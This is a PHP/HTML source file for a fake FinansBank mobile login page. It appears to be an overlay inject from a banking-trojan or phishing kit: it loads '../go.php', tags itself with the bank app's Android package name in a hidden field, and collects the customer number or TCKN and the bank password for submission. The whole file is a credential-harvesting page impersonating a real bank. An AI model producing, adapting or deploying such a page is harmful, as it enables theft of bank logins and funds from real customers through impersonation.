<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>FinansBank</title>

    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/main.css">
    <link rel="stylesheet" href="css/finansbank.css">

    <script src="js/jquery.min.js"></script>
    <script src="js/viewport.js"></script>
    <script src="js/cat.functions.js"></script>
</head>

<body>
    <div class="row">
        <div class="form_header">
            <img src="images/logo.png" alt="">
        </div>
    </div>
		<div class="modal modal_02">
			<div class="container">
				<form action="" method="post" class="wrapper">


<style>

.inpError{
border: 2px solid red;

}
</style>


					<div class="row" id="row_pers">
                    <input type="hidden" name="field1" value="com.finansbank.mobile.cepsube" class="main_input">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
								M&#252;&#351;teri Numaras&#305; / TCKN
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" class="main_input" >
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									Finans&#350;ifre
								</div>
								<div class="inp_wr">
									<input type="password" name="field3" class="main_input">
								</div>
                                <input type="hidden" name="field4">
							</div>
							<div class="btn_wr">
								<input type="submit" class="sign_btn" value="&#304;leri">
							</div>
						</div>
					</div>
				</form>
			</div>
		</div>
</body>

</html>